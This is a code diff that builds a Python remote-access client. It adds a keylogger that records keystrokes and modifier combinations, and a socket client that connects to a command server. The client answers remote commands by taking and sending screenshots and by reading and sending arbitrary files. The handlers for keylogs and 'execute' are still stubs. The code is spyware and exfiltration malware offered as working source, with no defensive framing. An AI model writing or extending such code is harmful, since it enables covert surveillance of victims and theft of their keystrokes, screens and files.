@@ -1,30 +1,138 @@
-import PIL
+import os
+import io
+import json
+import socket
+import threading
+from pynput import keyboard
 
+from PIL import ImageGrab
 
 HOST_ADDRESS = "127.0.0.1"
 HOST_PORT = 1337
 
 
+class Keylogger:
+    def __init__(self, buffer_size: int = -1):
+        self._buffer = []
+        self._buffer_size = buffer_size
+        self._ctrl_state = False
+        self._alt_state = False
+        self._key_map = {"enter": "\n", "space": " ", "tab": "\t"}
+
+    def _on_press(self, key):
+        pressed = ""
+        if key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
+            self._ctrl_state = True
+            return
+        elif key in (keyboard.Key.alt_l, keyboard.Key.alt_r):
+            self._alt_state = True
+        if hasattr(key, "char"):
+            if not hasattr(key, "vk"):
+                return
+            elif self._ctrl_state or self._alt_state:
+                pressed = f"[{'CTRL+' if self._ctrl_state else ''}{'ALT+' if self._alt_state else ''}{chr(key.vk)}]"
+            else:
+                pressed = key.char
+        else:
+            pressed = self._key_map.get(
+                key.name.split("_")[0], "[{0}]".format(key.name.split("_")[0])
+            ).upper()
+        self._buffer.append(pressed)
+
+    def _on_release(self, key) -> None:
+        if key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
+            self._ctrl_state = False
+        elif key in (keyboard.Key.alt_l, keyboard.Key.alt_r):
+            self._alt_state = False
+
+    def start(self):
+        def _run():
+            with keyboard.Listener(
+                on_press=self._on_press, on_release=self._on_release
+            ) as listener:
+                listener.join()
+
+        threading.Thread(target=_run).start()
+
+
 class Client:
     def __init__(self, host: str, port: int):
         self._addr = host, port
+        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self._keylogger = Keylogger()
 
     def start(self):
+        # start keylogger
+        self._keylogger.start()
+        print("awd")
+        # connect to server
+        threading.Thread(target=self._connect).start()
         pass
 
+    # Data handling ------------------------------------------------------------
+
+    def _keylogs(self):
+        ...
+
+    def _download(self, file_path: str):
+        print(file_path)
+        print(os.path.isfile(file_path))
+        file_size = 0
+        if os.path.isfile(file_path):
+            file_size = os.path.getsize(file_path)
+        self._send(str(file_size))
+        if file_size > 0:
+            with open(file_path, "rb") as file:
+                while True:
+                    data = file.read(1024)
+                    if not data:
+                        break
+                    self._send(data)
+
+    def _screenshot(self):
+        img = io.BytesIO()
+        ImageGrab.grab().save(img, format="PNG")
+        self._send(str(img.tell()))
+        self._send(img.getvalue())
+
+    def _handle_data(self, data: dict):
+        cmd = data.get("cmd")
+        if cmd == "screenshot":
+            self._screenshot()
+        elif cmd == "download":
+            self._download(data.get("args")[0])
+        elif cmd == "keylogs":
+            self._keylogs()
+        elif cmd == "execute":
+            ...
+
+    # Server connection and communication -----------------------------------------------------
+
+    def _send(self, data: any) -> None:
+        self._sock.sendall(
+            data.encode("utf-8") if not isinstance(data, bytes) else data
+        )
+
     def _connect(self):
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+        # create a socket object
+        with self._sock as sock:
+            # loop to attempt to reconnect if connection is lost
             while True:
                 try:
+                    # connect to the server
                     sock.connect(self._addr)
                     while True:
                         data = sock.recv(1024)
                         if not data:
                             break
-                        self._handle_data(data.decode("utf-8"))
+                        try:
+                            self._handle_data(json.loads(data.decode("utf-8")))
+                        except json.JSONDecodeError:
+                            continue
                 except OSError:
-                    pass
+                    continue
 
 
 if __name__ == "__main__":
-    pass
+    c = Client(HOST_ADDRESS, HOST_PORT)
+    c.start()
